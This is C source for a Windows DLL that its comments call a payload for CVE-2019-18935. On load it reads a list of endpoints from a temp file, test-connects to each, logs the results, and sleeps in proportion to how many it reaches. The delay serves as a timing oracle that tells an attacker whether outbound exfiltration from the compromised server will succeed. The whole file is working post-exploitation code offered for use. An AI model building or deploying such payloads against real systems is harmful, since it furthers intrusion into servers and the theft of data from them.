#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#pragma comment(lib, "ws2_32")

/*
 * probe-net.c — CVE-2019-18935 payload: outbound-egress oracle.
 *
 * Why: when nothing comes back from an exfil payload you cannot tell "payload
 * never ran" from "payload ran, egress is firewalled". This DLL answers that
 * without needing a writable web dir and without any listener on your side.
 *
 * It reads endpoints (one per line) from C:\Windows\Temp\net.txt — HTTP URLs,
 * host:port pairs, or dns:<name> — and TCP-connects to each with a 1 s timeout
 * while still inside DllMain. It then sleeps 8 s per successful endpoint
 * (capped at 24 s), so the deserialize request's response time *is* the result:
 *
 *     0 s  -> nothing reachable (or the DLL never ran)
 *     8 s  -> exactly 1 reachable
 *     16 s -> 2 reachable
 *     24 s -> 3+ reachable: egress works, exfil will work
 *
 * Results (ok/fail per endpoint, resolved IPs) are written to
 * C:\Windows\Temp\egress.txt for a later file-read channel.
 *
 * Kept deliberately free of system()/CreateProcess: everything here happens
 * under the loader lock.
 */

#define CFG   "C:\\Windows\\Temp\\net.txt"
#define LOGF  "C:\\Windows\\Temp\\egress.txt"
#define MAXE  4
#define TMO   1000

/* 0 = connected, otherwise a Winsock error (or -1 for a DNS failure) */
static int connect_to(const char *host, int port)
{
    struct addrinfo hints, *res = NULL, *p;
    char portbuf[8];
    SOCKET s = INVALID_SOCKET;
    u_long nb = 1;
    int err = -1;
    DWORD start;
    fd_set wfds, efds;
    struct timeval tv;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    snprintf(portbuf, sizeof(portbuf), "%d", port);

    if (getaddrinfo(host, portbuf, &hints, &res) != 0 || !res)
        return -1;

    for (p = res; p; p = p->ai_next) {
        s = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
        if (s == INVALID_SOCKET)
            continue;

        ioctlsocket(s, FIONBIO, &nb);
        if (connect(s, p->ai_addr, (int)p->ai_addrlen) == 0) {
            closesocket(s);
            err = 0;
            break;
        }
        err = WSAGetLastError();
        if (err != WSAEWOULDBLOCK) {
            closesocket(s);
            continue;
        }

        FD_ZERO(&wfds);
        FD_ZERO(&efds);
        FD_SET(s, &wfds);
        FD_SET(s, &efds);
        start = GetTickCount();
        for (;;) {
            tv.tv_sec = 0;
            tv.tv_usec = TMO * 1000;
            if (select(0, NULL, &wfds, &efds, &tv) > 0) {
                int so = 0, len = sizeof(so);
                getsockopt(s, SOL_SOCKET, SO_ERROR, (char *)&so, &len);
                err = so;
                break;
            }
            if (GetTickCount() - start >= (DWORD)TMO) { err = WSAETIMEDOUT; break; }
        }
        closesocket(s);
        if (err == 0) break;
    }
    freeaddrinfo(res);
    return err;
}

/* "https://host[:port]/path", "host:port", "dns:name" -> connect test */
static int test_line(const char *line)
{
    char buf[512], *h, *colon;
    int port = 443;

    strncpy(buf, line, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = 0;

    h = buf;
    if (!strncmp(h, "https://", 8)) { h += 8; port = 443; }
    else if (!strncmp(h, "http://", 7)) { h += 7; port = 80; }
    else if (!strncmp(h, "dns:", 4)) { h += 4; port = 53; }

    /* keep the host only: drop path, then pull an explicit port */
    h[strcspn(h, "/")] = 0;
    if (h[0] == '[') {                       /* [ipv6]:port */
        char *close = strchr(h, ']');
        if (close) { h++; *close = 0; if (close[1] == ':') port = atoi(close + 2); }
    } else if ((colon = strchr(h, ':')) != NULL) {
        *colon = 0;
        port = atoi(colon + 1);
    }
    if (!h[0] || port <= 0 || port > 65535)
        return -1;
    return connect_to(h, port);
}

static int run_probes(void)
{
    FILE *f = fopen(CFG, "rb");
    FILE *log = fopen(LOGF, "wb");
    char line[512];
    int ok = 0, n = 0;

    if (log) {
        SYSTEMTIME st;
        GetLocalTime(&st);
        fprintf(log, "# %04d-%02d-%02d %02d:%02d:%02d\n", st.wYear, st.wMonth,
                st.wDay, st.wHour, st.wMinute, st.wSecond);
    }
    if (!f) {
        if (log) { fprintf(log, "cfg missing: %s\n", CFG); fclose(log); }
        return 0;
    }

    while (n < MAXE && fgets(line, sizeof(line), f)) {
        int r;
        line[strcspn(line, "\r\n")] = 0;
        if (!line[0] || line[0] == '#')
            continue;
        n++;
        r = test_line(line);
        if (r == 0) {
            ok++;
            if (log) fprintf(log, "OK   %s\n", line);
        } else {
            if (log) fprintf(log, "FAIL %s (err=%d)\n", line, r);
        }
    }
    fclose(f);

    if (log) { fprintf(log, "\n%d/%d reachable\n", ok, n); fclose(log); }
    return ok;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    WSADATA wsa;
    int ok;

    (void)lpReserved;
    if (fdwReason != DLL_PROCESS_ATTACH)
        return TRUE;
    DisableThreadLibraryCalls(hinstDLL);

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
        return TRUE;

    ok = run_probes();

    if (ok > 3) ok = 3;                       /* cap the oracle at 24 s */
    if (ok > 0) Sleep(8000 * ok);

    WSACleanup();
    return TRUE;
}
